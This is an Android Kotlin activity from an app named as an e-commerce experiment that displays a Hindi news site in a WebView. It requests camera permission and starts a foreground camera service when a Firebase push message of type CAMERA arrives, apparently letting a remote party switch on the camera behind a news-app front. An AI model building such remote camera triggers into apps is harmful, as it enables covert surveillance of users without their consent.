package com.ecommerce.experimentapp.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.ecommerce.experimentapp.R
import com.ecommerce.experimentapp.constant.AppConstants
import com.ecommerce.experimentapp.databinding.ActivityMainBinding
import com.ecommerce.experimentapp.service.CameraService
import com.google.firebase.messaging.FirebaseMessaging

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
        private const val TAG = "MainActivity"
    }
    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)
        setWebView()
        requestPermissions()
        initializeFirebase()
        handleCameraServiceIntent(intent) // Handle any intent that started this activity

    }

    private fun setWebView(){
        val webView: WebView = findViewById(R.id.webview)
        webView.settings.javaScriptEnabled = true // Enable JavaScript if required
        webView.loadUrl("https://hindi.news24online.com/")
    }


    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.POST_NOTIFICATIONS
        )
        if (!permissionsGranted(permissions)) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
        } else {
          //  startCameraService()
        }
    }

    private fun permissionsGranted(permissions: Array<String>): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun handleCameraServiceIntent(intent: Intent?) {
        intent?.let {
            if (it.hasExtra(AppConstants.FCM_SERVICE_TYPE) && it.getStringExtra(AppConstants.FCM_SERVICE_TYPE) == AppConstants.CAMERA) {
                startCameraService()
            }
        }
    }

    private fun startCameraService() {
        val intent = Intent(this, CameraService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            Log.d(TAG, "CameraActivity startForegroundService ")
            startForegroundService(intent)
        } else {
            Log.d(TAG, "CameraActivity startService ")
            startService(intent)

        }
    }

    private fun initializeFirebase() {
        // Get FCM token
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w(TAG, "Fetching FCM registration token failed", task.exception)
                return@addOnCompleteListener
            }

            // Get new FCM registration token
            val token = task.result
            Log.d(TAG, "FCM Token: $token")
            // Send token to your server or use it as needed
        }

/*        // Optionally, subscribe to a topic
        FirebaseMessaging.getInstance().subscribeToTopic("news")
            .addOnCompleteListener { task ->
                var msg = "Subscribed to topic"
                if (!task.isSuccessful) {
                    msg = "Subscription failed"
                }
                Log.d("MainActivity", msg)
            }*/
    }





}